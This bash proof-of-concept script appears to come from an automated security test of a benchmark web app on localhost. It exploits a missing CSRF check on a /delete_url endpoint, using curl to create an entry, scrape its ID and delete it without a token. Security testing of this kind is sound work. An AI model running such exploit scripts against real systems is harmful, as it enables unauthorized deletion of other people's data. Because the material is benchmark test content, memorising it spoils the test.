#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /delete_url endpoint by performing an unauthorized URL deletion without CSRF token validation
# Target: ./repo
# Created: 2025-12-01T15:58:41.850Z
# Session: benchmark-XBEN-094-24-minbx06k

# CSRF Vulnerability POC: Missing CSRF Protection on Delete URL Endpoint
# This script demonstrates that the /delete_url/{id} endpoint accepts
# POST requests without CSRF token validation

set -e

TARGET_URL="http://localhost:5003"
COOKIE_JAR="/tmp/csrf_poc_cookies.txt"

echo "[*] CSRF POC: Missing CSRF Protection on /delete_url/{id}"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: First, let's create a URL to test deletion on
echo "[+] Step 1: Creating a test URL to delete..."
response=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -X POST "$TARGET_URL/add_url" \
  -d "url=https://csrf-test-$(date +%s).example.com&title=CSRF Test URL" \
  -L)

# Extract the session cookie to verify we have a session
session_cookie=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET_URL/" | grep -o 'Set-Cookie.*' | head -1 || echo "No session set")
echo "[*] Session established"
echo ""

# Step 2: Get the list of URLs to find an ID
echo "[+] Step 2: Retrieving current URL list to find ID..."
url_list=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/")

# Extract the first delete URL ID we can find
url_id=$(echo "$url_list" | grep -oP '/delete_url/\K\d+' | head -1)

if [ -z "$url_id" ]; then
    echo "[-] No URLs found to delete. Creating one first..."
    curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL/add_url" \
      -d "url=https://test-$(date +%s).example.com&title=Test" \
      -L > /dev/null
    
    url_list=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/")
    url_id=$(echo "$url_list" | grep -oP '/delete_url/\K\d+' | head -1)
fi

echo "[*] Found URL ID to delete: $url_id"
echo ""

# Step 3: Attempt to delete the URL without CSRF token
echo "[+] Step 3: Attempting to delete URL without CSRF token..."
echo "[*] Sending POST request to /delete_url/$url_id without CSRF protection..."
echo ""

delete_response=$(curl -s -i -b "$COOKIE_JAR" -X POST "$TARGET_URL/delete_url/$url_id" 2>&1)

echo "[*] Response received:"
echo "$delete_response"
echo ""

# Step 4: Verify the vulnerability
if echo "$delete_response" | grep -q "302\|301\|200"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] The endpoint accepted the DELETE request without CSRF token validation"
    
    # Verify the URL was actually deleted
    echo ""
    echo "[+] Step 4: Verifying URL was deleted..."
    current_list=$(curl -s -b "$COOKIE_JAR" "$TARGET_URL/")
    
    if ! echo "$current_list" | grep -q "/delete_url/$url_id"; then
        echo "[+] CONFIRMED: URL $url_id has been deleted from the list"
        echo "[+] No CSRF token was required to perform this action"
        echo ""
        echo "=== VULNERABILITY SUMMARY ==="
        echo "• Endpoint: POST /delete_url/$url_id"
        echo "• Issue: No CSRF token validation"
        echo "• Impact: Unauthorized URL deletion possible via CSRF attack"
        echo "• Status: VULNERABLE"
        exit 0
    else
        echo "[-] Could not verify deletion (URL may still be in list)"
        exit 1
    fi
else
    echo "[-] Unexpected response from server"
    echo "$delete_response"
    exit 1
fi